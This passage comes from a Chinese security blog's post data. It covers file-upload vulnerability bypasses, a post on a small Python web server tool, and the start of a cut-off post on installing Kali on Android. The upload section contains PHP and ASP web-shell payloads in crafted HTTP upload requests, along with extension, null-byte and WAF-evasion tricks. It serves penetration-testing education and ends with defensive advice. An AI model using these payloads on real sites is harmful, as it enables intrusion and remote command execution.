我们可以通过抓包，将content-type字段改为image/gif<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">POST /upload.php HTTP/1.1</div><div class=\"line\">TE: deflate,gzip;q=0.3</div><div class=\"line\">Connection: TE, close</div><div class=\"line\">Host: localhost</div><div class=\"line\">User-Agent: libwww-perl/5.803</div><div class=\"line\">Content-Type: multipart/form-data; boundary=xYzZY</div><div class=\"line\">Content-Length: 155</div><div class=\"line\">--xYzZY</div><div class=\"line\">Content-Disposition: form-data; name=<span class=\"string\">\"userfile\"</span>; filename=<span class=\"string\">\"shell.php\"</span></div><div class=\"line\">Content-Type: image/gif (原为 Content-Type: text/plain)</div><div class=\"line\">&lt;?php system(<span class=\"variable\">$_GET</span>[<span class=\"string\">'command'</span>]);?&gt;</div><div class=\"line\">--xYzZY-</div></pre></td></tr></table></figure></p>\n<h5 id=\"2-2-文件头绕过\"><a href=\"#2-2-文件头绕过\" class=\"headerlink\" title=\"2.2 文件头绕过\"></a>2.2 文件头绕过</h5><p>　　在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a&lt;?php phpinfo(); ?&gt;</p>\n<h5 id=\"2-3-文件后缀名绕过\"><a href=\"#2-3-文件后缀名绕过\" class=\"headerlink\" title=\"2.3 文件后缀名绕过\"></a>2.3 文件后缀名绕过</h5><p>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。<br>绕过方法：<br>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>能被解析的文件扩展名列表：<br>jsp  jspx  jspf<br>asp  asa  cer  aspx<br>php  php  php3  php4<br>exe  exee</p>\n<h4 id=\"3-配合文件包含漏洞\"><a href=\"#3-配合文件包含漏洞\" class=\"headerlink\" title=\"3.配合文件包含漏洞\"></a>3.配合文件包含漏洞</h4><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#PHP    </span></div><div class=\"line\">&lt;?php Include(<span class=\"string\">\"上传的txt文件路径\"</span>);?&gt; </div><div class=\"line\"><span class=\"comment\">#ASP    </span></div><div class=\"line\">&lt;!--<span class=\"comment\">#include file=\"上传的txt文件路径\" --&gt;</span></div><div class=\"line\"><span class=\"comment\">#JSP    </span></div><div class=\"line\">&lt;jsp:inclde page=<span class=\"string\">\"上传的txt文件路径\"</span>/&gt;</div><div class=\"line\">or  </div><div class=\"line\">&lt;%@include file=<span class=\"string\">\"上传的txt文件路径\"</span>%&gt;</div></pre></td></tr></table></figure></p>\n<h4 id=\"4-配合服务器解析漏洞\"><a href=\"#4-配合服务器解析漏洞\" class=\"headerlink\" title=\"4.配合服务器解析漏洞\"></a>4.配合服务器解析漏洞</h4><p>详细可参考：<a href=\"http://thief.one/2016/09/21/服务器解析漏洞/\">http://thief.one/2016/09/21/服务器解析漏洞/</a></p>\n<h4 id=\"5-配合操作系统文件命令规则\"><a href=\"#5-配合操作系统文件命令规则\" class=\"headerlink\" title=\"5.配合操作系统文件命令规则\"></a>5.配合操作系统文件命令规则</h4><p>（1）上传不符合windows文件命名规则的文件名<br>　　test.asp.<br>　　test.asp(空格)<br>　　test.php:1.jpg<br>　　test.php::$DATA<br>　　shell.php::$DATA…….<br>会被windows系统自动去掉不符合规则符号后面的内容。<br>（2）linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>\n<h4 id=\"6-CMS、编辑器漏洞\"><a href=\"#6-CMS、编辑器漏洞\" class=\"headerlink\" title=\"6.CMS、编辑器漏洞\"></a>6.CMS、编辑器漏洞</h4><p>（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。<br>（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</p>\n<h4 id=\"7-配合其他规则\"><a href=\"#7-配合其他规则\" class=\"headerlink\" title=\"7.配合其他规则\"></a>7.配合其他规则</h4><p>（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候<br>　　test.php(0x00).jpg<br>　　test.php%00.jpg<br>　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg<br>伪代码演示：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</div><div class=\"line\"><span class=\"built_in\">type</span> =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</div><div class=\"line\"><span class=\"keyword\">if</span>(<span class=\"built_in\">type</span> == jpg)</div><div class=\"line\">   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断</div><div class=\"line\">//最后以 help.asp 存入路径里</div></pre></td></tr></table></figure></p>\n<h4 id=\"8-WAF绕过\"><a href=\"#8-WAF绕过\" class=\"headerlink\" title=\"8.WAF绕过\"></a>8.WAF绕过</h4><h5 id=\"8-1-垃圾数据\"><a href=\"#8-1-垃圾数据\" class=\"headerlink\" title=\"8.1 垃圾数据\"></a>8.1 垃圾数据</h5><p>　　有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；<br><img src=\"/upload_image/20160922/1.png\" alt=\"\"><br>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。<br><img src=\"/upload_image/20160922/2.png\" alt=\"\"><br>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>\n<h5 id=\"8-2-filename\"><a href=\"#8-2-filename\" class=\"headerlink\" title=\"8.2 filename\"></a>8.2 filename</h5><p>针对早期版本安全狗，可以多加一个filename<br><img src=\"/upload_image/20160922/3.png\" alt=\"\"><br>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：<br><img src=\"/upload_image/20160922/13.png\" alt=\"\"></p>\n<h5 id=\"8-3-POST-GET\"><a href=\"#8-3-POST-GET\" class=\"headerlink\" title=\"8.3 POST/GET\"></a>8.3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>\n<h5 id=\"8-4-以上方式\"><a href=\"#8-4-以上方式\" class=\"headerlink\" title=\"8.4 以上方式\"></a>8.4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p>\n<p><em>————————————————2017.2.6更新————————————————–</em></p>\n<h5 id=\"8-5-利用waf本身缺陷\"><a href=\"#8-5-利用waf本身缺陷\" class=\"headerlink\" title=\"8.5 利用waf本身缺陷\"></a>8.5 利用waf本身缺陷</h5><h6 id=\"删除实体里面的Conten-Type字段\"><a href=\"#删除实体里面的Conten-Type字段\" class=\"headerlink\" title=\"删除实体里面的Conten-Type字段\"></a>删除实体里面的Conten-Type字段</h6><p><img src=\"/upload_image/20160922/4.png\" alt=\"\"><br>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">正常包：Content-Disposition: form-data; name=<span class=\"string\">\"image\"</span>; filename=<span class=\"string\">\"085733uykwusqcs8vw8wky.png\"</span>Content-Type: image/png</div><div class=\"line\">构造包：Content-Disposition: form-data; name=<span class=\"string\">\"image\"</span>; filename=<span class=\"string\">\"085733uykwusqcs8vw8wky.png</div><div class=\"line\">C.php\"</span></div></pre></td></tr></table></figure></p>\n<h6 id=\"删除Content-Disposition字段里的空格\"><a href=\"#删除Content-Disposition字段里的空格\" class=\"headerlink\" title=\"删除Content-Disposition字段里的空格\"></a>删除Content-Disposition字段里的空格</h6><p><img src=\"/upload_image/20160922/5.png\" alt=\"\"><br>增加一个空格导致安全狗被绕过案列：<br>Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099<br>尝试在boundary后面加个空格或者其他可被正常处理的字符：<br>boundary= —————————47146314211411730218525550</p>\n<h6 id=\"修改Content-Disposition字段值的大小写\"><a href=\"#修改Content-Disposition字段值的大小写\" class=\"headerlink\" title=\"修改Content-Disposition字段值的大小写\"></a>修改Content-Disposition字段值的大小写</h6><p><img src=\"/upload_image/20160922/6.png\" alt=\"\"></p>\n<h6 id=\"Boundary边界不一致\"><a href=\"#Boundary边界不一致\" class=\"headerlink\" title=\"Boundary边界不一致\"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099</div><div class=\"line\">Content-Length: 253</div><div class=\"line\">-----------------------------4714631421141173021852555099</div><div class=\"line\">Content-Disposition: form-data; name=<span class=\"string\">\"file1\"</span>; filename=<span class=\"string\">\"shell.asp\"</span></div><div class=\"line\">Content-Type: application/octet-stream</div><div class=\"line\"></div><div class=\"line\">&lt;%<span class=\"built_in\">eval</span> request(<span class=\"string\">\"a\"</span>)%&gt;</div><div class=\"line\">-----------------------------4714631421141173021852555099--</div></pre></td></tr></table></figure></p>\n<p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：<br>Win2k3 + IIS6.0 + ASP<br><img src=\"/upload_image/20160922/7.png\" alt=\"\"></p>\n<h6 id=\"文件名处回车\"><a href=\"#文件名处回车\" class=\"headerlink\" title=\"文件名处回车\"></a>文件名处回车</h6><p><img src=\"/upload_image/20160922/8.png\" alt=\"\"></p>\n<h6 id=\"多个Content-Disposition\"><a href=\"#多个Content-Disposition\" class=\"headerlink\" title=\"多个Content-Disposition\"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP<br><img src=\"/upload_image/20160922/9.png\" alt=\"\"></p>\n<h5 id=\"利用NTFS-ADS特性\"><a href=\"#利用NTFS-ADS特性\" class=\"headerlink\" title=\"利用NTFS ADS特性\"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。<br><img src=\"/upload_image/20160922/10.png\" alt=\"\"></p>\n<h4 id=\"其他情况补充\"><a href=\"#其他情况补充\" class=\"headerlink\" title=\"其他情况补充\"></a>其他情况补充</h4><h5 id=\"文件重命名绕过\"><a href=\"#文件重命名绕过\" class=\"headerlink\" title=\"文件重命名绕过\"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。<br><img src=\"/upload_image/20160922/11.png\" alt=\"\"></p>\n<h5 id=\"特殊的长文件名绕过\"><a href=\"#特殊的长文件名绕过\" class=\"headerlink\" title=\"特殊的长文件名绕过\"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：<br>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p>\n<h5 id=\"反删除\"><a href=\"#反删除\" class=\"headerlink\" title=\"反删除\"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）<br><img src=\"/upload_image/20160922/12.png\" alt=\"\"></p>\n<p><hr></p>\n<h3 id=\"文件校验的几点建议\"><a href=\"#文件校验的几点建议\" class=\"headerlink\" title=\"文件校验的几点建议\"></a>文件校验的几点建议</h3><ul>\n<li>文件扩展名服务端白名单校验。</li>\n<li>文件内容服务端校验。</li>\n<li>上传文件重命名。</li>\n<li>隐藏上传文件路径。</li>\n</ul>\n<p>　　以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。</p>\n<p>参考文章：<br><a href=\"https://xianzhi.aliyun.com/forum/read/458.html?fpage=2\">https://xianzhi.aliyun.com/forum/read/458.html?fpage=2</a><br><em>还有一篇tools上大牛的文章，url暂时找不到了……</em></p>"},{"title":"基于Python的WebServer","date":"2016-09-14T07:12:39.000Z","comments":1,"_content":"\n　　WebServer的主要功能是用来运行代码，处理http请求等服务，比如常见的Apache，IIS，Nginx等都可以用来解析代码，处理请求。以上几种容器（中间件）功能强大，但是安装配置比较麻烦，对于像我这样的菜鸟来说，搭建一个web服务器可能要花几天时间。如果我们搭建web服务器并不是专门为了处理大规模的请求，而只是为了测试使用，那么一个方便速成的WebServer就至关重要了。\n<!-- more -->\n#### Python WebServer编程介绍\n\n* BaseHTTPServer: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。\n* SimpleHTTPServer: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。\n* CGIHTTPServer: 包含处理POST请求和执行CGIHTTPRequestHandler类\n\n```bash\npython -m SimpleHTTPServer 8000\n```\npython内置很多好用的库，此时打开浏览器，访问localhost:8000端口即可。\n\n#### PyWebServer介绍\n\n　　由于用python搭建一个简易的WebServer十分方便，因此我便写一个简单的启动器，类似于SimpleHTTPServer。为了方便没有安装python环境的windows机子启动，用pyinstaller工具将py程序打包成了exe可执行程序。\n\n##### Linux下运行代码\n\n```bash\npython PyWebServer.py -h\npython PyWebServer.py -i 10.0.0.1 -p 8888   ##指定ip与端口,默认为8888\n```\n##### windows下运行代码\n\n```bash\nPyWebServer.exe -h  \nPyWebServer.exe -p 8888      ##指定端口,默认为8888\n```\n运行完以后,可以在其他机子上访问，进行文件下载等操作！\n\n#### PyWebServer功能\n\n功能可以自由想象发挥，比如说：\n* 可以在服务器上运行程序，解析一段精心构造的py代码，远程执行系统命令。（如不在同一网段，需要转发端口）\n* 可以在服务器上运行程序，用来替代FTP等工具，下载服务器上的文件（当服务器是linux时，使用比较方便）\n......\n\n#### 工具下载\n\nPyWebServer \t[下载地址](https://github.com/tengzhangchao/PyWebServer)\n\n\n\n","source":"_posts/基于Python的WebServer.md","raw":"---\ntitle: 基于Python的WebServer\ndate: 2016-09-14 15:12:39\ncomments: true\ntags: python运维脚本\ncategories: 安全工具\n---\n\n　　WebServer的主要功能是用来运行代码，处理http请求等服务，比如常见的Apache，IIS，Nginx等都可以用来解析代码，处理请求。以上几种容器（中间件）功能强大，但是安装配置比较麻烦，对于像我这样的菜鸟来说，搭建一个web服务器可能要花几天时间。如果我们搭建web服务器并不是专门为了处理大规模的请求，而只是为了测试使用，那么一个方便速成的WebServer就至关重要了。\n<!-- more -->\n#### Python WebServer编程介绍\n\n* BaseHTTPServer: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。\n* SimpleHTTPServer: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。\n* CGIHTTPServer: 包含处理POST请求和执行CGIHTTPRequestHandler类\n\n```bash\npython -m SimpleHTTPServer 8000\n```\npython内置很多好用的库，此时打开浏览器，访问localhost:8000端口即可。\n\n#### PyWebServer介绍\n\n　　由于用python搭建一个简易的WebServer十分方便，因此我便写一个简单的启动器，类似于SimpleHTTPServer。为了方便没有安装python环境的windows机子启动，用pyinstaller工具将py程序打包成了exe可执行程序。\n\n##### Linux下运行代码\n\n```bash\npython PyWebServer.py -h\npython PyWebServer.py -i 10.0.0.1 -p 8888   ##指定ip与端口,默认为8888\n```\n##### windows下运行代码\n\n```bash\nPyWebServer.exe -h  \nPyWebServer.exe -p 8888      ##指定端口,默认为8888\n```\n运行完以后,可以在其他机子上访问，进行文件下载等操作！\n\n#### PyWebServer功能\n\n功能可以自由想象发挥，比如说：\n* 可以在服务器上运行程序，解析一段精心构造的py代码，远程执行系统命令。（如不在同一网段，需要转发端口）\n* 可以在服务器上运行程序，用来替代FTP等工具，下载服务器上的文件（当服务器是linux时，使用比较方便）\n......\n\n#### 工具下载\n\nPyWebServer \t[下载地址](https://github.com/tengzhangchao/PyWebServer)\n\n\n\n","slug":"基于Python的WebServer","published":1,"updated":"2017-02-14T01:12:03.338Z","layout":"post","photos":[],"link":"","_id":"ciz80dybm00193ofvor86nhr0","content":"<p>　　WebServer的主要功能是用来运行代码，处理http请求等服务，比如常见的Apache，IIS，Nginx等都可以用来解析代码，处理请求。以上几种容器（中间件）功能强大，但是安装配置比较麻烦，对于像我这样的菜鸟来说，搭建一个web服务器可能要花几天时间。如果我们搭建web服务器并不是专门为了处理大规模的请求，而只是为了测试使用，那么一个方便速成的WebServer就至关重要了。<br><a id=\"more\"></a></p>\n<h4 id=\"Python-WebServer编程介绍\"><a href=\"#Python-WebServer编程介绍\" class=\"headerlink\" title=\"Python WebServer编程介绍\"></a>Python WebServer编程介绍</h4><ul>\n<li>BaseHTTPServer: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。</li>\n<li>SimpleHTTPServer: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。</li>\n<li>CGIHTTPServer: 包含处理POST请求和执行CGIHTTPRequestHandler类</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python -m SimpleHTTPServer 8000</div></pre></td></tr></table></figure>\n<p>python内置很多好用的库，此时打开浏览器，访问localhost:8000端口即可。</p>\n<h4 id=\"PyWebServer介绍\"><a href=\"#PyWebServer介绍\" class=\"headerlink\" title=\"PyWebServer介绍\"></a>PyWebServer介绍</h4><p>　　由于用python搭建一个简易的WebServer十分方便，因此我便写一个简单的启动器，类似于SimpleHTTPServer。为了方便没有安装python环境的windows机子启动，用pyinstaller工具将py程序打包成了exe可执行程序。</p>\n<h5 id=\"Linux下运行代码\"><a href=\"#Linux下运行代码\" class=\"headerlink\" title=\"Linux下运行代码\"></a>Linux下运行代码</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">python PyWebServer.py -h</div><div class=\"line\">python PyWebServer.py -i 10.0.0.1 -p 8888   <span class=\"comment\">##指定ip与端口,默认为8888</span></div></pre></td></tr></table></figure>\n<h5 id=\"windows下运行代码\"><a href=\"#windows下运行代码\" class=\"headerlink\" title=\"windows下运行代码\"></a>windows下运行代码</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">PyWebServer.exe -h  </div><div class=\"line\">PyWebServer.exe -p 8888      <span class=\"comment\">##指定端口,默认为8888</span></div></pre></td></tr></table></figure>\n<p>运行完以后,可以在其他机子上访问，进行文件下载等操作！</p>\n<h4 id=\"PyWebServer功能\"><a href=\"#PyWebServer功能\" class=\"headerlink\" title=\"PyWebServer功能\"></a>PyWebServer功能</h4><p>功能可以自由想象发挥，比如说：</p>\n<ul>\n<li>可以在服务器上运行程序，解析一段精心构造的py代码，远程执行系统命令。（如不在同一网段，需要转发端口）</li>\n<li>可以在服务器上运行程序，用来替代FTP等工具，下载服务器上的文件（当服务器是linux时，使用比较方便）<br>……</li>\n</ul>\n<h4 id=\"工具下载\"><a href=\"#工具下载\" class=\"headerlink\" title=\"工具下载\"></a>工具下载</h4><p>PyWebServer     <a href=\"https://github.com/tengzhangchao/PyWebServer\" target=\"_blank\" rel=\"external\">下载地址</a></p>\n","excerpt":"<p>　　WebServer的主要功能是用来运行代码，处理http请求等服务，比如常见的Apache，IIS，Nginx等都可以用来解析代码，处理请求。以上几种容器（中间件）功能强大，但是安装配置比较麻烦，对于像我这样的菜鸟来说，搭建一个web服务器可能要花几天时间。如果我们搭建web服务器并不是专门为了处理大规模的请求，而只是为了测试使用，那么一个方便速成的WebServer就至关重要了。<br>","more":"</p>\n<h4 id=\"Python-WebServer编程介绍\"><a href=\"#Python-WebServer编程介绍\" class=\"headerlink\" title=\"Python WebServer编程介绍\"></a>Python WebServer编程介绍</h4><ul>\n<li>BaseHTTPServer: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。</li>\n<li>SimpleHTTPServer: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。</li>\n<li>CGIHTTPServer: 包含处理POST请求和执行CGIHTTPRequestHandler类</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python -m SimpleHTTPServer 8000</div></pre></td></tr></table></figure>\n<p>python内置很多好用的库，此时打开浏览器，访问localhost:8000端口即可。</p>\n<h4 id=\"PyWebServer介绍\"><a href=\"#PyWebServer介绍\" class=\"headerlink\" title=\"PyWebServer介绍\"></a>PyWebServer介绍</h4><p>　　由于用python搭建一个简易的WebServer十分方便，因此我便写一个简单的启动器，类似于SimpleHTTPServer。为了方便没有安装python环境的windows机子启动，用pyinstaller工具将py程序打包成了exe可执行程序。</p>\n<h5 id=\"Linux下运行代码\"><a href=\"#Linux下运行代码\" class=\"headerlink\" title=\"Linux下运行代码\"></a>Linux下运行代码</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">python PyWebServer.py -h</div><div class=\"line\">python PyWebServer.py -i 10.0.0.1 -p 8888   <span class=\"comment\">##指定ip与端口,默认为8888</span></div></pre></td></tr></table></figure>\n<h5 id=\"windows下运行代码\"><a href=\"#windows下运行代码\" class=\"headerlink\" title=\"windows下运行代码\"></a>windows下运行代码</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">PyWebServer.exe -h  </div><div class=\"line\">PyWebServer.exe -p 8888      <span class=\"comment\">##指定端口,默认为8888</span></div></pre></td></tr></table></figure>\n<p>运行完以后,可以在其他机子上访问，进行文件下载等操作！</p>\n<h4 id=\"PyWebServer功能\"><a href=\"#PyWebServer功能\" class=\"headerlink\" title=\"PyWebServer功能\"></a>PyWebServer功能</h4><p>功能可以自由想象发挥，比如说：</p>\n<ul>\n<li>可以在服务器上运行程序，解析一段精心构造的py代码，远程执行系统命令。（如不在同一网段，需要转发端口）</li>\n<li>可以在服务器上运行程序，用来替代FTP等工具，下载服务器上的文件（当服务器是linux时，使用比较方便）<br>……</li>\n</ul>\n<h4 id=\"工具下载\"><a href=\"#工具下载\" class=\"headerlink\" title=\"工具下载\"></a>工具下载</h4><p>PyWebServer     <a href=\"https://github.com/tengzhangchao/PyWebServer\">下载地址</a></p>"},{"title":"安卓版Kali-linux","date":"2017-02-10T03:36:30.000Z","comments":1,"_content":"　　据说OPPO拍照神器最近很火，于是便凑热闹买了一款（R9s），外形不错，性能说得过去。尤其是自拍功能爱不释手（......），于是手头原本的小米便闲置了出来。作为一名崇尚节俭持家的技术男，当然是要废物利用一番，于是便有了以下的一番折腾。\n　　我的目的是打造一款渗透测试专用手机，最先想到的方案是在手机上安装kali-linx系统，因为该系统集成了很多渗透测试工具，解决了很多依赖问题，省去不少麻烦。那么问题来了，怎么在手机上安装kali-linux系统呢？在查找了一些资料之后，我理了理思路：\n（1）手机需要root\n（2）手机上安装linux-deploy\n（3）在linux-deploy上安装kali\n（4）在kali里面安装渗透测试工具\n思路有了，那么让我们撸起袖子干起来吧！(以下提到的安装包会在文章最后提供下载！)\n\n### Root\n　　起初看到网上的一些教程，介绍root手机非常简单，下载第三方软件，便可一键root。于是抱着轻松地态度在电脑上下载了一款软件（root精灵），接着将手机连上电脑，便开始点击一键root了。过了几分钟提示root成功，心想，原来破解手机这么简单，刚想吐槽小米，打开手机便发现根本没有root成功，NM坑爹。然后卸载了此软件，又重新找了一款（root大师），结果同样如此。\n　　心中默默骂了几条街后，喝口水冷静了会，重新上网搜索资料，竟然无意看到了小米官方提供开发者版本的安装包（晕倒，所以不能盲目使用第三方软件，一般厂商会给出相应的软件或者安装包）。\n　　官方下载地址：[http://www.miui.com/download-241.html](http://www.miui.com/download-241.html)\n　　根据官方提供的教程安装即可（我选择了第二种安装方式），安装完以后在安全中心授予应用程序root权限，其他品牌的手机请自行百度，方法大同小异。\n\n### 安装linux-deploy\n　　Linux deploy是一个可以快速在Android设备上安装运行Linux操作系统的App,遵循GPLv3协议，运行需要root权限。linux-deploy软件介绍：[http://www.cnblogs.com/mzlw/p/4841707.html](http://www.cnblogs.com/mzlw/p/4841707.html)\n在手机上安装完linux-deploy，运行后进行配置：\n![](/upload_image/20170210/3.png)\n运行界面如上图所示，点击右下角进行配置：\n![](/upload_image/20170210/1.png)\n发行版选择：kali-linux；源地址选择国内镜像：http://202.141.160.110/kali/\n![](/upload_image/20170210/2.png)\n勾选上ssh,vnc，在启动系统后会自动开启ssh以及vnc服务，方便远程管理。\n配置完成后点击安装，等待一会。\n![](/upload_image/20170210/4.png)\n安装完以后点击启动，如若成功，便可以用ssh工具连接此系统。\n![](/upload_image/20170210/6.png)\n\n注：linux-deploy只是一款软件，安装它对应手机本身不会造成什么影响（除了占用存储空间），也不会清空数据（不是刷机）\n\nlinux-deploy安装kali参考：\n[http://www.freebuf.com/articles/terminal/13209.html](http://www.freebuf.com/articles/terminal/13209.html)\n[http://www.freebuf.com/articles/terminal/47817.html](http://www.freebuf.com/articles/terminal/47817.html)\n\n### kali上安装渗透工具\n　　虽然手机上安装kali成功了，但是此kali系统上并没有任何工具，需要自己安装。因为kali官方的源太慢了，因此建议更换国内的源。手机上安装一个ssh远程连接工具，连接上kali系统，并输入以下命令：\n```bash\nvim /etc/apt/sources.list\n```\n清空文件内容并添加以下内容：\n```bash\ndeb http://202.141.160.110/kali/ kali-rolling main contrib non-free\ndeb-src http://202.141.160.110/kali kali-rolling main contrib non-free\n```\n更换完以后，更新源：\n```bash\nsudo su       #切换到root用户\napt-get update\napt-get upgrade\n```\n安装工具：\n```bash\napt-get install nmap\napt-get install sqlmap\napt-get install metasploit-framework\n......\n```\n运行截图：\n![](/upload_image/20170210/5.png)\n*运行速度还行，方便携带，居家旅行必备神器！*\n\n### 其他安全工具\n　　除了在安卓手机上安装kali系统以外，很多安全软件也支持安卓系统，比如dsploit、busybox、nmap for android等。首先在手机上安装busybox软件（授予root权限），运行软件以后勾选上智能安装选项，然后点击安装busybox。安装完busybox后，才可以使用dsploit等软件，当然这些软件也都是需要root权限的。至于这些安全软件的用法，网上一搜一大推，这里便不再介绍了。\n\n### 软件工具下载\n链接: [https://pan.baidu.com/s/1miqcGjQ](https://pan.baidu.com/s/1miqcGjQ)  密码: ch5f\n\n\n<center>*有时候折腾仅仅只是为了折腾，仅此而已！*</center>","source":"_posts/安卓版Kali-linux.md","raw":"---\ntitle: 安卓版Kali-linux\ndate: 2017-02-10 11:36:30\ncomments: true\ntags: kali\ncategories: 技术交流\n---\n　　据说OPPO拍照神器最近很火，于是便凑热闹买了一款（R9s），外形不错，性能说得过去。尤其是自拍功能爱不释手（......），于是手头原本的小米便闲置了出来。作为一名崇尚节俭持家的技术男，当然是要废物利用一番，于是便有了以下的一番折腾。\n　　我的目的是打造一款渗透测试专用手机，最先想到的方案是在手机上安装kali-linx系统，因为该系统集成了很多渗透测试工具，解决了很多依赖问题，省去不少麻烦。那么问题来了，怎么在手机上安装kali-linux系统呢？在查找了一些资料之后，我理了理思路：\n（1）手机需要root\n（2）手机上安装linux-deploy\n（3）在linux-deploy上安装kali\n（4）在kali里面安装渗透测试工具\n思路有了，那么让我们撸起袖子干起来吧！(以下提到的安装包会在文章最后提供下载！)\n\n### Root\n　　